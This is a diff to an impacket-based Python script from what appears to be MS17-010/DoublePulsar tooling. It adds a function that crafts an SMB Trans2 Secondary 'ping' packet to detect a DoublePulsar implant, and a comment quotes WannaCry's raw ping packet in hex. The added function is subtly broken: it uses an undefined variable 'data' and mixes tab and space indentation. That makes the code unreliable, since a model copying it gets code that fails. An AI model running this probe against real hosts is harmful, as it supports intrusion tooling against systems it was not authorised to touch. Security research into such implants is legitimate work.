@@ -127,7 +127,44 @@ class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
         ('FID','<H=0'),
     )
     
-    
+def send_trans2_ping(conn, tid):
+	pkt = smb.NewSMBPacket()
+	pkt['Tid'] = tid
+
+	# assume no params
+
+	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
+	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
+	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
+
+	transCommand['Parameters']['TotalParameterCount'] = 0
+	transCommand['Parameters']['TotalDataCount'] = len(data)
+
+	fixedOffset = 32+3+18
+	transCommand['Data']['Pad1'] = ''
+
+	transCommand['Parameters']['ParameterCount'] = 0
+	transCommand['Parameters']['ParameterOffset'] = 0
+
+	if len(data) > 0:
+		pad2Len = (4 - fixedOffset % 4) % 4
+		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
+	else:
+		transCommand['Data']['Pad2'] = ''
+		pad2Len = 0
+  
+        #trans2 ping command contains no parameters.
+	transCommand['Parameters']['DataCount'] = 0x0000
+	transCommand['Parameters']['DataOffset'] = 0x0000
+	transCommand['Parameters']['DataDisplacement'] = 0x0000
+        
+	#trans2 ping command contains no data
+	#transCommand['Data']['Trans_Parameters'] = ''
+	#transCommand['Data']['Trans_Data'] = data
+	pkt.addCommand(transCommand)
+
+	conn.sendSMB(pkt)
+	
 def send_trans2_second(conn, tid, data, displacement):
 	pkt = smb.NewSMBPacket()
 	pkt['Tid'] = tid
@@ -172,7 +209,9 @@ if __name__ == "__main__":
     tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 
     #send doublepulsar ping packet to get signature
-    send_trans2_second(conn, tid)
+    #Trans2 ping from Wannacry -> trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+    #but in this case, we want to build the ping packet from scratch
+    send_trans2_ping(conn, tid)
     recvPkt = conn.recvSMB()
     retStatus = recvPkt.getNTStatus()
     
